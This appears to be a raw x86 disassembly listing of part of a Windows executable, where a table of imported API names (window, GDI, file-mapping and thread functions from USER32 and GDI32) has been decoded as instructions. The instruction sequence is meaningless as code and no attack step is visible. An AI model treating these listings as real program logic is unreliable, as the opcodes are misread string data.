  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
